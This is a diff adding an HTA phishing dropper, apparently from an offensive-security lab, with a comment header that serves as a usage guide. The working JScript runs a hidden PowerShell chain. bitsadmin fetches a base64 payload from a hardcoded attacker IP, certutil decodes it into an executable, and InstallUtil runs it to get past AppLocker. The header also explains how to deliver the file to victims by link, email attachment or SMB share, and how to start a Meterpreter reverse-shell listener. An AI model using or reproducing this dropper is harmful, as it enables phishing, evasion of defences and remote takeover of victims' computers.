@@ -1,0 +1,100 @@
+<!--
+================================================================
+nonDN2J.hta — HTA Phishing Dropper: bitsadmin + certutil + InstallUtil Chain
+================================================================
+WHAT THIS DOES:
+  An HTA (HTML Application) file that runs JScript via mshta.exe when
+  opened. When executed, it runs the following chain silently:
+
+  1. bitsadmin /Transfer — downloads a BASE64-ENCODED binary from your
+     web server and saves it as C:\Windows\Temp\enc3.txt
+     (bitsadmin is a Windows built-in download utility)
+
+  2. certutil -decode — decodes the base64 file back into a real .exe
+     and saves it as C:\Windows\Temp\bypass.exe
+     (certutil is a Windows built-in certificate utility — commonly
+      abused to decode payloads; bypass for download restrictions)
+
+  3. InstallUtil.exe — runs bypass.exe via the InstallUtil AppLocker
+     bypass so the .exe runs even under AppLocker restrictions
+
+  4. self.close() — closes the HTA window automatically
+
+HOW TO PREPARE YOUR PAYLOAD (on Kali):
+  1. Compile your clrunner.exe (or any InstallUtil-compatible .exe)
+
+  2. Base64-encode it:
+       base64 -w 0 clrunner.exe > enc3.txt
+
+  3. Host enc3.txt on your web server:
+       cp enc3.txt /var/www/html/enc3.txt
+       python3 -m http.server 80
+
+  4. CHANGE the IP in this file (see below)
+
+BEFORE USE — CHANGE THIS VALUE IN THE CODE:
+  Change: http://192.168.49.173/enc3.txt
+  To:     http://<YOUR_KALI_IP>/enc3.txt
+
+  The IP appears in the single Run() call below — change 192.168.49.173
+  to your actual Kali IP address.
+
+HOW TO DELIVER (phishing):
+  Option A — Hosted file (victim clicks a link):
+    1. Host this HTA on your web server:
+         python3 -m http.server 80
+    2. Send victim the URL: http://<KALI_IP>/nonDN2J.hta
+    3. When victim clicks "Open" in their browser -> mshta.exe runs it
+    4. The script executes in the background, window closes automatically
+
+  Option B — Email attachment:
+    1. Attach the .hta file directly to a phishing email
+    2. Victim must click "Open" (not "Save") when prompted by Outlook
+    3. mshta.exe runs the HTA automatically
+
+  Option C — SMB share:
+    1. Copy to a share the victim can access
+    2. Send them a UNC path link or phishing email with the path
+
+HOW TO TEST LOCALLY (on a Windows test machine):
+  Double-click the .hta file
+  OR run from cmd:
+    mshta.exe C:\path\to\nonDN2J.hta
+  OR run remotely:
+    mshta.exe http://<KALI_IP>/nonDN2J.hta
+
+START YOUR LISTENER (on Kali) BEFORE DELIVERING:
+  msfconsole -q -x "use exploit/multi/handler; \
+    set payload windows/x64/meterpreter/reverse_tcp; \
+    set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
+
+WHAT EACH PART DOES (line by line):
+  bitsadmin /Transfer newjob3 http://... c:\windows\temp\enc3.txt
+    -> Downloads base64 file from your server to temp folder
+
+  certutil -decode c:\windows\temp\enc3.txt c:\windows\temp\bypass.exe
+    -> Decodes the base64 back to the actual .exe
+
+  InstallUtil.exe /logfile= /LogToConsole=false /U c:\windows\temp\bypass.exe
+    -> Runs bypass.exe via InstallUtil (AppLocker bypass)
+    -> /logfile= suppresses log file creation
+    -> /LogToConsole=false suppresses console output
+    -> /U calls the Uninstall() method (where the payload lives)
+
+BEFORE USE, CHANGE:
+  - 192.168.49.173 -> YOUR Kali IP (in the Run() call below)
+================================================================
+-->
+<html>
+<head>
+    <script language="JScript">
+        var shell = new ActiveXObject("WScript.Shell");
+        var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe")
+    </script>
+</head>
+<body>
+    <script language="JScript">
+        self.close();
+    </script>
+</body>
+</html>
